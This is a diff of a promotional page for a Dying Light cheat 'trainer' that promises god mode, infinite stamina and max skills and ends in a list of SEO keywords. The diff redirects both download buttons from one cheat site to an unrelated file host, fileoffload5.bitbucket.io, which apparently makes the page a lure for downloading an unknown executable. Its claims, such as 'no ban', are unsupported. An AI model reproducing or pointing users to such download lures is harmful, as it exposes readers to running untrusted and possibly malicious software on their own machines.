@@ -2,14 +2,14 @@
 
 **Sick of dying to Volatiles or grinding XP like it’s your day job? A Dying Light trainer gives you full control with instant god mode, infinite stamina, max skills, and more insane buffs.**
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/dying-light/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload5.bitbucket.io)
 ---
 
 ## 🧠 What is a Trainer in Dying Light?
 
 A **trainer** is a standalone app or script that hooks into the Dying Light process and gives you hotkey-activated power-ups in real time. No need for glitching, modding files, or grinding for 50 hours. Just run the trainer, launch the game, and press a key to dominate.
 
-[![Download Trainer](https://gameguru.ru/media/tinymce_images/1-6_qIGi3Bs.png)](https://wecheaters.github.io/cheats/dying-light/)
+[![Download Trainer](https://gameguru.ru/media/tinymce_images/1-6_qIGi3Bs.png)](https://fileoffload5.bitbucket.io)
 ---
 
 ## ⚔️ Top Features of Dying Light Trainer
@@ -104,3 +104,4 @@ Also: **Backup your save** just in case. Trainers can do a lot, and you don’t 
 dying light trainer, dying light god mode trainer, dying light cheat tool, dying light XP trainer, dying light modded trainer, infinite health dying light, dying light item hack, trainer for dying light PC, dying light one hit kill tool, dying light cheats no ban
 
 ---
+
